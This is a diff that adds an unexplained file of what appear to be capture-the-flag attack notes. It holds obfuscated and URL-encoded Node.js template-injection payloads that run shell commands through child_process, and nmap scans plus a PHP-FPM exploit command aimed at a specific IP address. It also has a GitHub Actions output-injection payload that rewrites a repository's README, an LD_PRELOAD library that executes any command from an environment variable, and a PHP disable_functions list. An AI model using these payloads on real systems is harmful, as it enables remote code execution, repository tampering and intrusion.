@@ -1,0 +1,58 @@
+'ADDRESS' readonly)
+
+' readonly);process.mainModule.constructor._load('child_process').exec('whoami');//
+
+
+-var x = eval(process.mainModule.constructor._load('child_process').exec('whoami').toString())
+
+
+username=admin&candyname=bunny _candy&address=
+ readonly)'%0a-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('calc').toString()")
+-return x
+/ l('
+
+ readonly)'
+-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('calc').toString()")
+-return x
+// l('
+
+
+15 username=rabbit&candyname=bunny_candy&address=
+%27%20%72%65%61%64%6f%6e%6c%79%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2d%76%61%72%20%78%20%3d%20%65%76%61%6c%28%22%67%6c%6f%62%22%20%2b%20%22%61%6c%2e%70%72%6f%63%65%22%20%2b%20%22%73%73%2e%6d%61%69%6e%4d%6f%22%20%2b%20%22%64%75%6c%65%2e%72%65%22%20%2b%20%22%71%75%69%72%65%28%27%63%68%69%6c%64%5f%27%2b%27%70%72%6f%27%2b%27%63%65%73%73%27%29%5b%27%65%78%27%2b%27%65%63%53%79%6e%63%27%5d%28%27%63%61%74%20%2f%66%2a%27%29%2e%74%6f%53%74%72%69%6e%67%28%29%22%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%7b%78%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2f%2f
+
+
+
+nmap -A -v -T4 -O -sV 123.60.21.23
+nmap -sS -p 1-65535 -v 123.60.21.23
+
+python fpm.py -c '<?php echo(`id`);exit;?>' -p 54120 123.60.21.23 /var/www/html/index.php
+
+10022/tcp open  unknown
+23333/tcp open  elxmgmt
+54120/tcp open  unknown
+60001/tcp open  unknown
+
+PORT      STATE SERVICE
+10022/tcp open  unknown
+23333/tcp open  elxmgmt
+54120/tcp open  unknown
+60001/tcp open  unknown
+
+https://adworld.xctf.org.cn/match/contest_challenge?event=153&hash=d068dfd5-afdf-47c7-92a3-1d833b2d90a8.event#:~:text=https%3A//github.com/CheckInChallenge/CheckIn
+
+haztag-01:::set-output name=flag::1;(async()=>{const e=await github.repos.getContent({owner:"CheckInChallenge",path:"README.md",repo:"CheckIn",ref:"refs/heads/main"});await github.repos.createOrUpdateFileContents({owner:"CheckInChallenge",repo:"CheckIn",path:"README.md",message:"editing",content:"SSBkaWQgaXQ=",branch:"main","committer.name":"Yawn","committer.email":"email","author.name":"Yawn","author.email":"email",sha:e.data.sha})})();
+
+
+gcc hack.c -o hack.so -shared -fPIC
+
+#include <stdlib.h>
+#include <string.h>
+__attribute__((constructor))void payload() {
+unsetenv("LD_PRELOAD");
+const char* cmd = getenv("CMD");//接收传入的命令
+system(cmd);//执行命令
+}
+
+stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive
+
+/run/php/php7.3-fpm.sock
